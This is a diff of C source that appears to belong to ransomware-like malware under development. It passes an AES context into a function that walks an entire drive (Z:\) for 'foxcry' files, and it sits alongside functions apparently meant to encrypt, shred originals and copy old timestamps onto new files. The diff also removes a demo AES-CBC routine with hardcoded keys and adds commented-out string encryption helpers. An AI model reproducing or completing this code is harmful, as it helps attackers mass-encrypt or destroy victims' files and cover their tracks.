@@ -6,67 +6,20 @@ void endeda(char* ret, const char* path_old, const char* path_new, int key);
 void copy_old_time(struct stat* st, const char* path_new);
 int randInRange(int min, int max);
 char randomByte();
-void processFilesRecursively(const char* basePath, const char* ext);
+//void en_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
+//void de_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
+void processFilesRecursively(struct AES_ctx* ctx, const char* basePath, const char* ext);
 
 int main(int argc, char *argv[])
 {
 	srand (time(NULL));
 	
+	struct AES_ctx ctx;
+	
 	char* path = (char*)malloc(PATH_SIZE * sizeof(char));
 	strcpy(path, "Z:\\");
-	processFilesRecursively(path, "foxcry");
+	processFilesRecursively(&ctx, path, "foxcry");
 	free(path);
-	
-	struct AES_ctx ctx;
-
-	uint8_t key[] = "aaaaaaaaaaaaaaaa";
-	uint8_t iv[]  = "bbbbbbbbbbbbbbbb";
-	uint8_t str[] = "This a sample text, Length eq 32";
-
-	printf("\n raw buffer \n");
-	for (int i = 0; i < 32; ++i) {
-		printf("%.2x", str[i]);
-	}
-
-	AES_init_ctx_iv(&ctx, key, iv);
-	AES_CBC_encrypt_buffer(&ctx, str, 32);
-
-	printf("\n Encrypted buffer\n");
-
-	for (int i = 0; i < 32; ++i) {
-		printf("%.2x", str[i]);
-	}
-	
-	char output[(32 * 2) + 1];
-	char *ptr = &output[0];
-	for (int i = 0; i < 32; ++i) {
-		 ptr += sprintf(ptr, "%02X", str[i]);
-	}
-	printf("\n%s", output);
-	
-	size_t i;
-    int value;
-    for (i = 0; i < 32 && sscanf(output + i * 2, "%2x", &value) == 1; i++) {
-        str[i] = value;
-    }
-	
-	printf("\n raw buffer \n");
-	for (int i = 0; i < 32; ++i) {
-		printf("%.2x", str[i]);
-	}
-	printf("\n raw buffer \n");
-
-	printf("\n Decrypted buffer\n");
-
-	AES_init_ctx_iv(&ctx, key, iv);
-	AES_CBC_decrypt_buffer(&ctx, str, 32);
-
-	for (int i = 0; i < 32; ++i) {
-		printf("%.2x", str[i]);
-	}
-
-	printf("\n");
-	printf("%s\n", (char*)&str);
 	
 	return EXIT_SUCCESS;
 }
@@ -190,7 +143,46 @@ void shredder(struct stat* st, const char* path)
 	}
 }
 
-void processFilesRecursively(const char* basePath, const char* ext)
+/* void en_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output)
+{
+	size_t len = strlen(data);
+	
+	uint8_t* str = (uint8_t*)malloc((len + 1)* sizeof(uint8_t));
+	strcpy(str,data);
+	
+	AES_init_ctx_iv(ctx, (const uint8_t*)key, (const uint8_t*)iv);
+	AES_CBC_encrypt_buffer(ctx, str, len);
+	
+	*output = (char*)malloc(((len * 2) + 1)* sizeof(char));
+	char* ptr = &(*output[0]);
+	for (int i = 0; i < len; ++i) {
+		 ptr += sprintf(ptr, "%02X", str[i]);
+	}
+	
+	free(str);
+}
+
+void de_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output)
+{
+	size_t len = strlen(data)/2;
+	
+	uint8_t* str = (uint8_t*)malloc((len + 1)* sizeof(uint8_t));
+	size_t i;
+    int value;
+    for (i = 0; i < len && sscanf(data + i * 2, "%2x", &value) == 1; i++) {
+        str[i] = value;
+    }
+	
+	AES_init_ctx_iv(ctx, (const uint8_t*)key, (const uint8_t*)iv);
+	AES_CBC_decrypt_buffer(ctx, str, len);
+	
+	*output = (char*)malloc((len + 1)* sizeof(char));
+	strcpy(*output,str);
+	
+	free(str);
+} */
+
+void processFilesRecursively(struct AES_ctx* ctx, const char* basePath, const char* ext)
 {
     char path_old[PATH_SIZE];
 	char path_new[PATH_SIZE];
@@ -229,7 +221,7 @@ void processFilesRecursively(const char* basePath, const char* ext)
 			
 			if (dir_exists(path_old))
 			{				
-				processFilesRecursively(path_old, ext);
+				processFilesRecursively(ctx, path_old, ext);
 			}
 			else
 			{
